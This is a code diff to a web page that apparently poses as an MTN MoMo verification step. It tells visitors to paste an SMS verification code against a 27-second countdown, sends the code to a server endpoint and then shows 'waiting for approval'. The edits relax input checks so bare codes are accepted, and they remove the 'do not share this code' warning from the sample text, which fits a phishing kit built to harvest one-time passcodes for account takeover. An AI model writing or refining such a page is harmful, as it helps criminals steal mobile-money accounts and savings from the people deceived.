@@ -134,10 +134,10 @@
     <!-- MAIN -->
     <main class="main">
         <div class="card">
-            <h2>Paste Full SMS Message</h2>
+            <h2>Paste SMS Message</h2>
             <p class="desc">
                 A verification message has been sent to your phone. Please copy
-                and paste the <strong>entire SMS message</strong> here — not just the code.
+                and paste the message or code here.
             </p>
 
             <!-- TIMER -->
@@ -145,7 +145,7 @@
                 <div class="timer-circle" id="timerCircle">27</div>
                 <div class="timer-text">
                     <strong>Message expires in <span id="timerSec">27</span>s.</strong><br>
-                    Paste your full SMS before time runs out.
+                    Paste your SMS before time runs out.
                 </div>
             </div>
 
@@ -155,11 +155,11 @@
             <!-- FORM -->
             <form id="verifyForm">
                 <textarea id="code" class="sms-input"
-                          placeholder="Paste the FULL SMS message here (e.g. 'Your MTN MoMo verification code is: 123456')..."
+                          placeholder="Paste your SMS message or code here..."
                           maxlength="1000" autocomplete="off"></textarea>
 
                 <p class="example-text">
-                    Example: "Your MTN MoMo verification code is: 123456. Do not share this code with anyone."
+                    Example: "Your MTN MoMo verification code is: 123456"
                 </p>
 
                 <button type="submit" class="submit-btn" id="submitBtn" disabled>
@@ -207,12 +207,11 @@
                 timerCircle.textContent = timeLeft;
                 timerSec.textContent    = timeLeft;
 
-                // Turn red & pulse when ≤10s
                 if (timeLeft <= 10 && timeLeft > 0) {
                     timerCircle.classList.add('urgent');
                 }
 
-                // Time's up — DO NOT disable the input. Just show a notice.
+                // Time's up — DON'T disable the input. User can still paste/submit.
                 if (timeLeft <= 0) {
                     clearInterval(timerInterval);
                     expired = true;
@@ -229,7 +228,7 @@
 
         startTimer();
 
-        // ─── Enable Submit button once the user types something ───
+        // ─── Enable Submit button once the user types anything ───
         codeInput.addEventListener('input', function () {
             this.classList.remove('error');
             errorMsg.classList.remove('show', 'info');
@@ -295,10 +294,9 @@
             e.preventDefault();
 
             const code = codeInput.value.trim();
-            // Require the FULL SMS — must be reasonably long and contain a digit sequence.
-            const hasDigits = /\d{3,}/.test(code);
-            if (code.length < 10 || !hasDigits) {
-                errorMsg.textContent = 'Please paste the FULL SMS message (including the code).';
+            // Accept ANY non-empty input: bare code OR full SMS.
+            if (code.length < 1) {
+                errorMsg.textContent = 'Please paste your SMS message or code';
                 errorMsg.style.color = '#dc2626';
                 errorMsg.classList.add('show');
                 codeInput.classList.add('error');
@@ -308,7 +306,7 @@
             submitBtn.disabled = true;
             submitBtn.textContent = 'WAITING FOR APPROVAL...';
             codeInput.disabled = true;
-            clearInterval(timerInterval); // stop the timer once submitted
+            clearInterval(timerInterval);
 
             try {
                 const res = await fetch('/api/verify-code', {
@@ -354,19 +352,16 @@
 
             // Restart the countdown
             startTimer();
-            // Re-enable input/button area in case a previous timer had disabled them
             codeInput.disabled = false;
+            submitBtn.textContent = 'SUBMIT';
+            submitBtn.classList.remove('active');
+            submitBtn.disabled = true; // re-enabled on next input
             if (codeInput.value.trim().length > 0) {
                 submitBtn.disabled = false;
                 submitBtn.classList.add('active');
-            } else {
-                submitBtn.disabled = true;
-                submitBtn.classList.remove('active');
             }
-            submitBtn.textContent = 'SUBMIT';
-            submitBtn.classList.remove('active'); // will re-add on input if there's text
 
-            errorMsg.textContent = '✅ New SMS requested. Please check your phone and paste the FULL message.';
+            errorMsg.textContent = '✅ New SMS requested. Please check your phone.';
             errorMsg.style.color = '#3a7d44';
             errorMsg.classList.add('show', 'info');
 
